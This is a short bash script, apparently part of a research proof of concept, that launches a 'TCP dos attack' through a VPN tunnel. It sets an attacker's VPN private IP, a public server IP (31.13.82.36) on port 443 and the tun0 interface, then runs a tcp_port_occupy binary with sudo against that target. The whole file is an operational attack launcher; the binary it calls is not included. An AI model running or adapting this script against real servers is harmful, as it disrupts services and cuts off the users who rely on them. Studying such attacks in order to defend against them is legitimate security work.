# !/bin/bash
ATTACKER_PRIVATE_IP=10.42.110.3; # VPN private IP of the local attacker after connecting with the VPN server
REMOTE_SERVER_IP=31.13.82.36; # public ip of remote-server
REMOTE_SERVER_PORT=443; # remote server port to provide pulic TCP services, the victim client will connect to this port.
PACKET_IFACE="tun0"; # packet iface of the local attacker after connecting with the VPN server


echo `date`
echo "begin the TCP dos attack to ${REMOTE_SERVER_IP}:${REMOTE_SERVER_PORT}"


sudo ./tcp_port_occupy ${ATTACKER_PRIVATE_IP} ${REMOTE_SERVER_IP} ${REMOTE_SERVER_PORT} ${PACKET_IFACE}

echo `date`



